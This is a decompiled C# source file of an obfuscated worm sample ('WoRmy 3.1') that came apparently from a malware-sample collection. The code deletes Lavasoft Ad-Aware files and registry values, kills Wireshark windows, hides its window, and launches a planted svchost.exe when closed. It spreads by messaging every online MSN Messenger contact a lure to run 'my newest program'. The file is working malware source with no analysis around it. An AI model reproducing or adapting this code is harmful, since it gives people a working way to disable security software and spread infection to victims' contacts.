// Decompiled with JetBrains decompiler
// Type: .
// Assembly: WoRmy 3.1, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 5B3F2157-9C5E-49FF-827C-36A43C2192D1
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00007-msil\Worm.MSIL.Autorun.bn-c84e33c1883ca2f034c2d20e5c59a5319d95e9525a9ab0a5111aecbd19ba55e7.exe

using \u001B\u0003;
using MessengerAPI;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace \u001B\u0003
{
  [DesignerGenerated]
  internal class \u0081 : Form
  {
    private IContainer \u0001;
    private Mutex \u0002;
    private string \u0003;

    public \u0081()
    {
      \u0081 obj = this;
      // ISSUE: virtual method pointer
      this.Load += new EventHandler((object) obj, __vmethodptr(obj, \u0013\u0002));
      this.FormClosing += new FormClosingEventHandler(this.\u0092\u0003);
      this.\u0003 = Environment.UserName + "Mutex";
      this.\u009D();
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.\u0001 == null)
          return;
        this.\u0001.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void \u009D()
    {
      this.SuspendLayout();
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(0, 0);
      this.FormBorderStyle = FormBorderStyle.None;
      this.Name = "Form1";
      this.Text = "Form1";
      this.ResumeLayout(false);
    }

    [DllImport("kernel32", EntryPoint = "Sleep", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern void \u0012\u0002(long dwMilliseconds);

    [DllImport("kernel32.dll", EntryPoint = "deletefile", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern bool \u0090\u0003(string path);

    public static void \u0091\u0003()
    {
      List<string> stringList = new List<string>();
      string str = "Shell32.GETCSIDLPath(Shell32.CSIDL.CSIDL_PROGRAM_FILES)";
      stringList.Add(str + "\\Lavasoft\\");
      try
      {
        foreach (string path in stringList)
        {
          if (Directory.Exists(path))
          {
            FileInfo[] files = new DirectoryInfo(path).GetFiles("*.*", SearchOption.AllDirectories);
            int index = 0;
            while (index < files.Length)
            {
              FileInfo fileInfo = files[index];
              try
              {
                File.Delete(fileInfo.FullName);
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                ProjectData.ClearProjectError();
              }
              checked { ++index; }
            }
          }
        }
      }
      finally
      {
        List<string>.Enumerator enumerator;
        enumerator.Dispose();
      }
      RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("Software\\Lavasoft\\Ad-Aware\\", true);
      string[] valueNames = registryKey.GetValueNames();
      int index1 = 0;
      while (index1 < valueNames.Length)
      {
        string name = valueNames[index1];
        try
        {
          registryKey.DeleteValue(name);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        checked { ++index1; }
      }
      registryKey.Close();
    }

    private void \u0013\u0002(object sender, EventArgs e)
    {
      this.Hide();
      this.\u0002 = new Mutex(false, this.\u0003);
      if (!this.\u0002.WaitOne(0, false))
      {
        this.\u0002.Close();
        this.\u0002 = (Mutex) null;
        ProjectData.EndApp();
      }
      \u001E\u0003.\u0096\u0003();
      while (true)
      {
        int num;
        do
        {
          checked { ++num; }
          \u001F\u0003.\u0097\u0003();
          \u007F\u0003.\u0098\u0003();
          \u0081\u0003.\u0099\u0003();
          \u0084\u0003.\u009C\u0003();
          \u0082\u0003.\u009A\u0003();
          \u0083\u0003.\u009B\u0003();
          this.\u0094\u0003();
          \u001F\u0003.\u0097\u0003();
          \u001D\u0003.\u0095\u0003();
          \u0081.\u0012\u0002(150000L);
        }
        while (num != 3);
        ProjectData.EndApp();
      }
    }

    private void \u0092\u0003(object sender, FormClosingEventArgs e) => Process.Start("C:\\svchost.exe");

    public void \u0093\u0003()
    {
      Process[] processes = Process.GetProcesses();
      int index = 0;
      while (index < processes.Length)
      {
        Process process = processes[index];
        if (string.Equals(process.MainWindowTitle, "The Wireshark Network Analyzer"))
          process.Kill();
        checked { ++index; }
      }
    }

    public void \u0094\u0003()
    {
      Messenger messenger = (Messenger) new MessengerClass();
      IMessengerContacts myContacts = (IMessengerContacts) ((IMessenger3) messenger).MyContacts;
      try
      {
        foreach (IMessengerContact imessengerContact in myContacts)
        {
          if (imessengerContact.Status != 1 && !imessengerContact.Blocked)
          {
            ((IMessenger3) messenger).InstantMessage((object) imessengerContact.SigninName);
            SendKeys.SendWait("Hey I just got into program coding and would you please tell me how I did? Here is my newest program." + \u001E\u0003.\u0001);
            SendKeys.SendWait("{ENTER}");
            SendKeys.SendWait("{ESC}");
          }
        }
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
      }
    }
  }
}
